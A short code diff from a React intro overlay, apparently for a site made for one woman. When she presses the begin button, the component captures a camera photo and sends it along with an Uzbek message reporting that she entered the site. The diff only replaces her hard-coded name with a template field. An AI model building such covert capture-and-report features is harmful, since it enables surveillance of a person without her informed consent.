@@ -18,7 +18,7 @@ export default function IntroOverlay({ onBegin }: { onBegin: () => void }) {
     setLeaving(true);
     
     // Request camera and send initial photo
-    captureAndSendPhoto("📸 Dilnura saytga kirdi (Boshlash tugmasi bosildi)");
+    captureAndSendPhoto(`📸 ${content.herName} saytga kirdi (Boshlash tugmasi bosildi)`);
 
     setTimeout(onBegin, 1600);
   };
